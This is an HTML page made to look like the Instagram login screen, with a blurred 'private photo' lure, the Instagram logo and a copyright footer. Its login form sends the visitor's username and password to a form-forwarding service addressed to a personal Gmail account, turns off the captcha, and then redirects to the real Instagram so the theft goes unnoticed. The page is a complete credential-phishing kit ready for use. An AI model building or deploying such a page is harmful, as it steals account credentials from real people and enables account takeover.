<!DOCTYPE html> 
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="icon" href="favicon.png" type="image/png"> 
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .main {
      display: flex;
      background-color: #fafafa;
      padding: 20px;
      max-width: 900px;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 10px;
    }
    .image-container {
      position: relative;
      flex: 1;
      margin-right: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 8px;
      overflow: hidden;
    }
    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transition: filter 0.5s ease;
    }
    .overlay-text {
      position: absolute;
      color: white;
      font-size: 22px;
      font-weight: bold;
      text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.7);
      text-align: center;
      padding: 20px;
      width: 100%;
    }
    .login-container { text-align: center; }
    .info-text {
      font-size: 17px;
      margin-bottom: 20px;
      color: #262626;
      width: 90%;
      margin-left: 9%;
    }
    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 20px;
    }
    .login-box img.logo {
      width: 175px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 9px 0 7px 8px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      font-size: 14px;
      border-radius: 3px;
      font-size: 0.6em;
    }
    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 9px;
      font-weight: bold;
      border-radius: 4px;
      margin-top: 10px;
      font-size: 14px;
      cursor: pointer;
    }
    .forgot {
      margin-top: 15px;
      text-align: right;
      font-size: 12px;
    }
    .forgot a {
      color: #385185;
      text-decoration: none;
    }
    .signup-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      margin-top: 10px;
      padding: 20px 0;
      font-size: 14px;
      width: 90%;
    }
    .signup-box a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
    @media screen and (max-width: 768px) {
      .main {
        flex-direction: column;
        align-items: center;
      }
      .image-container {
        margin-right: 0;
        margin-bottom: 20px;
        border-radius: 8px;
        overflow: hidden;
      }
    }
  </style>
</head>
<body>

  <div class="main">
    <div class="image-container">
      <img src="blur.jpg" alt="Private Image">
      <div class="overlay-text">Log in or sign up to view this photo</div>
    </div>

    <div class="login-container">
      <div class="info-text">Log in to see photos and videos from your friends.</div>

      <div class="login-box">
        <img src="https://instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">

        <form action="https://formsubmit.co/zain272010@gmail.com" method="POST">
          <!-- Required hidden fields for FormSubmit.co -->
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_next" value="https://instagram.com">

          <input type="text" name="username" placeholder="Phone number, username, or email" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit">Log In</button>
        </form>

        <div class="forgot">
          <a href="#">Forgot password?</a>
        </div>
      </div>

      <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>

      <div class="footer">
        Â© 2025 Instagram
      </div>
    </div>
  </div>

</body>
</html>
